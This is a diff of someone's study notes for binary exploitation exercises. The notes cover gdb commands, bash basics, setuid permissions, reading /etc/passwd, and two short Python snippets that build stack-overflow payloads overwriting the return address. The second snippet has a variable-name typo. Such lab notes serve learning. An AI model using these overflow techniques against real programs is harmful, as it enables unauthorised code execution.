@@ -54,6 +54,7 @@ C Stuff --------------------------------------------
 file.c
 gcc -std=c99 file.c -o file
 objdump
+objdump -t file | grep func   (memory where function begins)
 hexdump
 strings
 gdb
@@ -83,18 +84,24 @@ GDB -------------------------------------------------------------
 gdb ./file1
 
 set disassembly-flavor intel
+x       (examine --- x win #examine win function)
+p       (print ------p win #print win function)
+x/s $esp  (examine string in ESP)
+x/1i $eip (examine 1 next instruction in EIP)
+x/8wx $esp (examine 8 words from stack ESP)
+info b  (show all break points)
 
 break *main
 run | r
 disassemble main
 info proc mappings    (mapped addressed in ram)
-x/wx $esp             (value in register)
+x/wx $esp             (WORD value in register)
 del                   (delete breakpoints)
 break *0x0804840c
 define hook-stop
 info registers
-x/24wx $esp
-x/2i $eip
+x/24wx $esp           (examine 24 words in STACK)
+x/2i $eip             (examine 2 instructions in EIP)
 end
 
 Python notes ---------------------------------------------------------------------------------
@@ -141,6 +148,7 @@ General Notes ------------------------------------------------------------------
 bash -------------------------
 (./Cprog1 ; ./Cprog2 parm1) > 2outputs.txt
 echo $SHELL
+bash -i
 uname -a  (print system information)
 file stack0 (info about file)
 cat /etc/passwd   (all users set up on system - UID)
@@ -155,3 +163,24 @@ rws:  run in security mode
 
 owner group user
 -rws | r-x | r-x:
+
+
+tmp scripts -----
+cd /tmp
+vim stack.py
+python stack.py > exp
+(gdb) r < /tmp/exp
+
+python overflow example
+
+padding = "AAAABBBBCCCCDDDD"
+padding += "\x24\x84\x04\x08"   #0x08048424    #little endian
+
+
+example2 --------------------------------------------
+
+import struct
+padding = "AAAABBBBCCCCDDDDEEEE"
+edp = "AAAA"
+eip = struct.pack("I", 0x080483f4)
+print padding+edbp+eip
